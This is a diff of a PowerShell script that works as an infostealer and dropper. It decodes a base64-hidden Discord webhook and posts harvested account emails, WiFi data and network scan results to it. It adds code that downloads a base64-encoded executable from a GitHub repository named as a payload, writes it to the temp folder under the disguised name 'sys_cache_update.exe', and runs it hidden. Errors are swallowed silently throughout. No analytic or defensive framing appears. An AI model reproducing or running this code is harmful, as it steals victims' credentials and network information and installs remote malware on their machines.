@@ -2,6 +2,7 @@ if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like
 
 $b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMDgzOTAyMjQwMTAyODE2Ni9KMExGc0JBSlBCR1BUZ08yaXNpcTZkcnB5TVdtR2h1czE0ZU1rdGNLdEl3cUw0VktIYmo1NTVjY1lFTjh5bkhRejBKZA=="
 $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))
+$url_b64_bin = "https://raw.githubusercontent.com/fridaynightmare/payload-geckolib/refs/heads/main/scanner"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 try {
@@ -30,8 +31,7 @@ try {
         "Accounts" = $found_emails
         "WiFi"     = $wifi_list
     }
-    $msgPayload = @{ content = '```json' + "`n" + ($reportData | ConvertTo-Json -Depth 5) + "`n" + '
-```' } | ConvertTo-Json
+    $msgPayload = @{ content = '```json' + "`n" + ($reportData | ConvertTo-Json -Depth 5) + "`n" + '```' } | ConvertTo-Json
     Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($msgPayload)) -ContentType 'application/json'
 } catch {}
 
@@ -84,8 +84,7 @@ try {
 
         if($netResults.Count -gt 0){
             $netJson = @{ "NETWORK_SCAN" = $netResults } | ConvertTo-Json
-            $msgNet = @{ content = '```json' + "`n" + $netJson + "`n" + '
-```' } | ConvertTo-Json
+            $msgNet = @{ content = '```json' + "`n" + $netJson + "`n" + '```' } | ConvertTo-Json
             Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($msgNet)) -ContentType 'application/json'
         }
         $pool.Close()
@@ -93,12 +92,17 @@ try {
 } catch {}
 
 try {
-    $url = "https://github.com/fridaynightmare/payload-geckolib/raw/refs/heads/main/scanner.exe"
     $dest = "$env:TEMP\sys_cache_update.exe"
+    $wc = New-Object System.Net.WebClient
+    
+    $base64_string = $wc.DownloadString($url_b64_bin).Trim()
+    
+    if ($base64_string) {
+        $bytes = [System.Convert]::FromBase64String($base64_string)
+        [System.IO.File]::WriteAllBytes($dest, $bytes)
 
-    (New-Object Net.WebClient).DownloadFile($url, $dest)
-
-    if (Test-Path $dest) {
-        Start-Process -FilePath $dest -WindowStyle Hidden -Args "/silent" -ErrorAction SilentlyContinue
+        if (Test-Path $dest) {
+            Start-Process -FilePath $dest -WindowStyle Hidden -Args "/silent" -ErrorAction SilentlyContinue
+        }
     }
 } catch {}
